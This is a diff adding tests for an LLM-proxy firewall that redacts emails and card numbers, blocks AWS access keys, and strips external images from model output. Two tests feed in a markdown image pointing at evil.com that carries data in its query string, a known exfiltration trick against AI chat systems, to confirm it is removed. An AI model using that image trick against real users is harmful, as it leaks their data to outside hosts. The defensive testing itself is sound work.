@@ -228,3 +228,103 @@ def test_invalid_metadata_is_rejected_before_upstream(client, upstream):
     )
     assert response.status_code == 400
     assert not upstream.requests
+
+
+LEAK_POLICY = BASE_POLICY + """  sensitive_data:
+    mode: redact
+    stages: [output, tool_result]
+    params:
+      categories:
+        - name: email
+          patterns: ['[\\w.+-]+@[\\w-]+(?:\\.[\\w-]+)+']
+        - name: card
+          patterns: ['\\b(?:\\d[ -]?){12,18}\\d\\b']
+          validator: luhn
+        - name: aws_access_key
+          patterns: ['\\b(?:AKIA|ASIA)[0-9A-Z]{16}\\b']
+          on_match: block
+  output_sanitizer:
+    mode: redact
+    params:
+      allowed_domains: ["*.bank.internal"]
+"""
+EMAIL = "jan.kowalski@bank.example"
+CARD = "4111 1111 1111 1111"
+
+
+def test_sensitive_data_redacted_in_echoed_reply(make_firewall_app):
+    client = TestClient(make_firewall_app(LEAK_POLICY))
+    messages = [{"role": "user", "content": f"Mail {EMAIL}, card {CARD}"}]
+    body = client.post(
+        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
+    ).json()
+    content = body["choices"][0]["message"]["content"]
+    assert content == "Mock response: Mail [EMAIL], card [CARD]"
+    assert body["firewall"]["output"]["decision"]["action"] == "redact"
+
+    (event,) = client.get("/v1/settings/events", params={"stage": "output"}).json()
+    assert event["action"] == "redact"
+    assert {f["type"] for f in event["findings"]} == {"email", "card"}
+    for value in (EMAIL, CARD):
+        assert value not in json.dumps(event["findings"])
+        assert value not in event["reason"]
+        assert value not in json.dumps(event["content_after"])  # stored after redaction
+
+
+def test_exfiltration_image_is_removed(make_firewall_app):
+    client = TestClient(make_firewall_app(LEAK_POLICY))
+    messages = [{"role": "user", "content": "![x](https://evil.com/?d=abc)"}]
+    body = client.post(
+        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
+    ).json()
+    assert body["choices"][0]["message"]["content"] == (
+        "Mock response: [image removed: evil.com]"
+    )
+    assert "d=abc" not in json.dumps(body["firewall"])
+
+
+def test_secret_in_prompt_blocked_before_upstream(make_firewall_app, upstream):
+    policy = LEAK_POLICY.replace(
+        "    mode: redact\n    stages: [output, tool_result]\n",
+        "    mode: block\n    stages: [input]\n",
+    )
+    app = make_firewall_app(policy, upstream_transport=upstream)
+    messages = [{"role": "user", "content": "deploy with AKIAIOSFODNN7EXAMPLE"}]
+    body = TestClient(app).post(
+        "/v1/chat/completions", json=completion("remote-model", messages), headers=HEADERS
+    ).json()
+    assert body["choices"][0]["finish_reason"] == "content_filter"
+    assert body["firewall"]["input"]["decision"]["action"] == "block"
+    assert "sensitive_data" in body["choices"][0]["message"]["content"]
+    assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(body)
+    assert upstream.requests == []
+
+
+def test_top_level_action_is_the_most_severe_of_both_stages(make_firewall_app):
+    """Redacted on input, clean on output: the summary must say `redact`, not `allow`."""
+    policy = LEAK_POLICY.replace("    stages: [output, tool_result]\n", "    stages: [input]\n")
+    client = TestClient(make_firewall_app(policy))
+    messages = [{"role": "user", "content": f"mail {EMAIL}"}]
+    body = client.post(
+        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
+    ).json()
+    firewall = body["firewall"]
+    assert body["choices"][0]["message"]["content"] == "Mock response: mail [EMAIL]"
+    assert firewall["input"]["decision"]["action"] == "redact"
+    assert firewall["output"]["decision"]["action"] == "allow"
+    assert firewall["action"] == "redact"
+    assert firewall["reason"].startswith("Redacted by sensitive_data")
+
+
+def test_redactions_on_both_stages_are_both_explained(make_firewall_app):
+    policy = LEAK_POLICY.replace("    stages: [output, tool_result]\n", "    stages: [input]\n")
+    client = TestClient(make_firewall_app(policy))
+    messages = [{"role": "user", "content": f"mail {EMAIL} ![x](https://evil.com/?d=1)"}]
+    firewall = client.post(
+        "/v1/chat/completions", json=completion(messages=messages), headers=HEADERS
+    ).json()["firewall"]
+    assert firewall["action"] == "redact"
+    assert firewall["reason"] == (
+        "input: Redacted by sensitive_data: sensitive data: email (1); "
+        "output: Redacted by output_sanitizer: unsafe output: external_image (1)"
+    )
